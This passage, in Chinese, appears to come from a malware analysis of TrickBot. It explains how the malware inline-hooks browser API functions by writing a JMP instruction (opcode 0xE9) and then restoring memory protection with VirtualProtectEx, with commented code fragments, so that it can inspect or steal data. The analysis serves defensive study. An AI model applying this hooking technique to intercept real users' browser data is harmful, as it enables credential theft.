    在原始 API 函数的开头写入一个无条件跳转 (JMP) 指令 (操作码 0xE9)，使其跳转到自定义的钩子函数。
    
    C++
    
    ```
    // jmp_32_bit_relative_offset_opcode = 0xE9u;
    // ... 计算和写入跳转逻辑 ...
    // write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // 手动写入钩子(JMP指令和偏移)
    ```
    
4. 恢复内存保护:
    
    将目标 API 函数的内存保护属性恢复到原始状态。
    
    C++
    
    ```
    // VirtualProtectEx( (HANDLE)0xFFFFFFFF, *(LPVOID *)(original_function + 1), ..., flOldProtect, &flOldProtect);
    ```
    

通过这种方式，当浏览器调用被挂钩的 API 时，执行流会首先跳转到 TrickBot 的恶意钩子函数，使其能够检查、修改参数或窃取数据，然后再选择性地调用原始 API 功能。这是典型的 API Inline Hooking 技术。